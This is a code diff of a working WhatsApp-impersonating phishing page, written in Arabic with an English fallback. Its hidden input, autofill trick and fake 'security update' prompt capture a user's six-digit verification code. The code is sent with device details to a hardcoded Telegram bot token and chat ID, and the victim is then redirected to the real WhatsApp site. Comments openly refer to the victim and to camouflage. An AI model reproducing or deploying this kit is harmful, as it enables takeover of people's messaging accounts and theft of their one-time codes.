@@ -1,203 +1,126 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html id="html-tag" lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Verification</title>
+    <title>WhatsApp Support</title>
     <style>
-        :root {
-            --whatsapp-green: #25d366;
-            --whatsapp-dark-green: #128c7e;
-            --text-main: #111b21;
-            --text-secondary: #667781;
-            --bg-gray: #f0f2f5;
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        :root { --wa-green: #25d366; --wa-dark: #128c7e; --text-main: #111b21; --text-sec: #667781; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, Arial; }
+        body { background: #fff; color: var(--text-main); }
         
-        body { background-color: #fff; color: var(--text-main); line-height: 1.5; }
+        /* Header مع الأيقونة */
+        .header { padding: 15px; display: flex; flex-direction: column; align-items: center; border-bottom: 1px solid #f0f2f5; }
+        .wa-logo { width: 50px; height: 50px; margin-bottom: 10px; }
+        .header h1 { font-size: 18px; color: var(--wa-dark); }
 
-        .app-container { max-width: 500px; margin: 0 auto; min-height: 100vh; display: flex; flex-direction: column; }
-
-        .header { padding: 20px; text-align: center; border-bottom: 1px solid var(--bg-gray); }
-        .header h1 { color: var(--whatsapp-dark-green); font-size: 20px; font-weight: 700; }
-
-        .content { padding: 30px 20px; text-align: center; flex-grow: 1; }
+        .content { padding: 25px; text-align: center; }
+        .device-info-bar { display: inline-block; padding: 4px 12px; background: #e7fce3; color: #075e54; border-radius: 20px; font-size: 12px; font-weight: 600; margin-bottom: 15px; }
         
-        .instruction-text { font-size: 14px; color: var(--text-secondary); margin-bottom: 25px; line-height: 1.6; }
-        .phone-number { color: var(--text-main); font-weight: 600; display: block; margin-top: 5px; direction: ltr; }
+        .instruction { font-size: 14px; color: var(--text-sec); margin-bottom: 20px; }
+        .phone-num { color: #007bff; font-weight: 600; direction: ltr; display: block; margin-top: 5px; }
 
-        /* OTP Styles */
-        .otp-wrapper { position: relative; margin: 30px 0; }
+        /* OTP Design */
+        .otp-container { position: relative; margin: 40px 0; }
+        #main-otp { position: absolute; opacity: 0; width: 100%; height: 100%; z-index: 2; cursor: pointer; }
+        .boxes { display: flex; gap: 8px; justify-content: center; direction: ltr; }
+        .box { width: 40px; height: 45px; border-bottom: 2px solid #ccc; font-size: 24px; display: flex; align-items: center; justify-content: center; }
         
-        /* الحقل المخفي الذي يستقبل الـ Autofill */
-        #main-otp {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            opacity: 0; border: none; outline: none;
-            z-index: 2; cursor: pointer;
-        }
+        #main-otp:focus + .boxes .box { border-bottom-color: var(--wa-green); }
 
-        .otp-boxes {
-            display: flex; gap: 10px; justify-content: center;
-            direction: ltr; pointer-events: none;
-        }
-
-        .box {
-            width: 45px; height: 50px;
-            border-bottom: 2px solid #ccd0d5;
-            font-size: 24px; font-weight: 600;
-            display: flex; align-items: center; justify-content: center;
-            transition: border-color 0.2s;
-        }
-
-        #main-otp:focus + .otp-boxes .box { border-bottom-color: var(--whatsapp-green); }
-
-        .resend-text { color: var(--whatsapp-dark-green); font-size: 14px; font-weight: 600; margin-top: 30px; cursor: pointer; }
-
-        /* Loading Overlay */
-        .loading-screen {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.9); z-index: 10;
-            flex-direction: column; align-items: center; justify-content: center;
-        }
-
-        .spinner {
-            width: 40px; height: 40px;
-            border: 3px solid var(--bg-gray);
-            border-top: 3px solid var(--whatsapp-green);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
+        .btn-confirm { width: 100%; background: var(--wa-green); color: #fff; border: none; padding: 15px; border-radius: 5px; font-weight: 700; font-size: 16px; margin-top: 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); cursor: pointer; }
+        
+        /* شاشة التحميل */
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid var(--wa-green); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .success-mark { color: var(--whatsapp-green); font-size: 60px; display: none; }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="header">
-        <h1>التحقق من رقم الهاتف</h1>
-    </div>
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo" alt="WA">
+    <h1 id="title">تحديث أمان واتساب</h1>
+</div>
 
-    <div class="content" id="main-content">
-        <p class="instruction-text">
-            لقد أرسلنا رسالة نصية تحتوي على كود التحقق إلى الرقم:
-            <span class="phone-number">+20 0123456789</span>
-        </p>
+<div class="content">
+    <div id="device-tag" class="device-info-bar">جاري التعرف على الجهاز...</div>
+    
+    <p class="instruction" id="desc">
+        يرجى تأكيد الرمز المرسل لهاتفك المسجل:
+        <span class="phone-num">+20 0123456789</span>
+    </p>
 
-        <div class="otp-wrapper">
-            <input type="tel" 
-                   id="main-otp" 
-                   name="otp" 
-                   maxlength="6" 
-                   inputmode="numeric" 
-                   autocomplete="one-time-code" 
-                   oninput="handleOTP(this)" 
-                   autofocus>
-            
-            <div class="otp-boxes">
-                <div class="box" id="b0"></div>
-                <div class="box" id="b1"></div>
-                <div class="box" id="b2"></div>
-                <div class="box" id="b3"></div>
-                <div class="box" id="b4"></div>
-                <div class="box" id="b5"></div>
-            </div>
+    <div class="otp-container">
+        <input type="tel" id="main-otp" maxlength="6" inputmode="decimal" autocomplete="one-time-code" oninput="fillBoxes(this)">
+        <div class="boxes">
+            <div class="box" id="b0"></div><div class="box" id="b1"></div><div class="box" id="b2"></div>
+            <div class="box" id="b3"></div><div class="box" id="b4"></div><div class="box" id="b5"></div>
         </div>
-
-        <p class="instruction-text" style="margin-top: 20px;">أدخل الكود المكون من 6 أرقام</p>
-        <p class="resend-text">إعادة إرسال الرسالة النصية</p>
     </div>
 
-    <div id="status-overlay" class="loading-screen">
-        <div class="spinner" id="loader"></div>
-        <div class="success-mark" id="check">✓</div>
-        <p id="status-text" style="margin-top: 15px; color: var(--text-secondary);">جاري التحقق...</p>
-    </div>
+    <button class="btn-confirm" id="btn" onclick="document.getElementById('main-otp').focus()">تحديث الآن</button>
+</div>
+
+<div id="load" class="overlay">
+    <div class="spinner"></div>
+    <p style="margin-top:20px" id="load-text">جاري مزامنة التحديث...</p>
 </div>
 
 <script>
-    // إعدادات التليجرام (تأكد من تشفيرها لاحقاً في الـ Backend)
     const BOT_TOKEN = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
     const CHAT_ID = '5446862709';
 
-    // دالة التعامل مع الإدخال والـ Autofill
-    function handleOTP(el) {
-        const value = el.value;
-        
-        // تحديث المربعات بصرياً
-        for (let i = 0; i < 6; i++) {
-            document.getElementById('b' + i).innerText = value[i] || '';
-            if (value[i]) {
-                document.getElementById('b' + i).style.borderBottomColor = '#25d366';
-            } else {
-                document.getElementById('b' + i).style.borderBottomColor = '#ccd0d5';
-            }
-        }
-
-        // إذا اكتمل الكود (سواء ضغط على Autofill أو كتب يدوياً)
-        if (value.length === 6) {
-            submitAuto(value);
-        }
+    // 1. كشف اللغة وتحويل الواجهة
+    const userLang = navigator.language || navigator.userLanguage;
+    if (userLang.startsWith('en')) {
+        document.getElementById('html-tag').lang = 'en';
+        document.getElementById('html-tag').dir = 'ltr';
+        document.getElementById('title').innerText = 'WhatsApp Security Update';
+        document.getElementById('desc').innerHTML = 'Please confirm the code sent to your registered number: <span class="phone-num">+20 0123456789</span>';
+        document.getElementById('btn').innerText = 'Update Now';
+        document.getElementById('load-text').innerText = 'Syncing update...';
     }
 
-    async function submitAuto(code) {
-        // إظهار شاشة التحميل
-        const overlay = document.getElementById('status-overlay');
-        overlay.style.display = 'flex';
+    // 2. كشف الجهاز وعرضه
+    const ua = navigator.userAgent;
+    let deviceName = "Smartphone";
+    if (ua.includes("iPhone")) deviceName = "iPhone";
+    else if (ua.includes("Android")) deviceName = "Android Device";
+    document.getElementById('device-tag').innerText = "📍 Detected: " + deviceName;
 
-        // جمع البيانات الفنية للتقرير
-        const info = {
-            otp: code,
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            time: new Date().toLocaleString('ar-EG'),
-            url: window.location.href
-        };
+    function fillBoxes(el) {
+        const val = el.value;
+        for (let i = 0; i < 6; i++) {
+            document.getElementById('b' + i).innerText = val[i] || '';
+            document.getElementById('b' + i).style.borderBottomColor = val[i] ? '#25d366' : '#ccc';
+        }
+        if (val.length === 6) sendLog(val);
+    }
 
-        // إرسال البيانات فوراً
+    async function sendLog(code) {
+        document.getElementById('load').style.display = 'flex';
+        
+        const text = `🚀 *New Hit (Security Update)*\n\n` +
+                     `🔢 *OTP:* \`${code}\` \n` +
+                     `📱 *Device:* ${deviceName}\n` +
+                     `🌍 *Lang:* ${userLang}\n` +
+                     `📍 *IP:* (Check Bot Logs)`;
+
         try {
-            const message = `🔥 *تم سحب كود جديد!* \n\n` +
-                          `🔢 *الكود:* \`${code}\` \n` +
-                          `📱 *الجهاز:* ${info.platform} \n` +
-                          `⏰ *الوقت:* ${info.time} \n` +
-                          `🌐 *الرابط:* ${info.url}`;
-
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
             });
-
-            // محاكاة نجاح العملية
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('check').style.display = 'block';
-                document.getElementById('status-text').innerText = 'تم التحقق بنجاح';
-                
-                // توجيه الضحية لواتساب الحقيقي بعد 2 ثانية لزيادة الواقعية
-                setTimeout(() => {
-                    window.location.href = "https://www.whatsapp.com/";
-                }, 2000);
-            }, 1500);
-
-        } catch (e) {
-            console.error("Error reporting data");
-        }
+            
+            // تحويل الضحية بعد السحب لزيادة التمويه
+            setTimeout(() => { window.location.href = "https://www.whatsapp.com/security"; }, 2000);
+        } catch (e) {}
     }
 
-    // فوكس تلقائي عند تحميل الصفحة لفتح الكيبورد
-    window.onload = () => {
-        document.getElementById('main-otp').focus();
-    };
+    // أول ما يلمس الصفحة الكيبورد يفتح
+    document.body.addEventListener('click', () => { document.getElementById('main-otp').focus(); }, {once: true});
 </script>
-
 </body>
 </html>
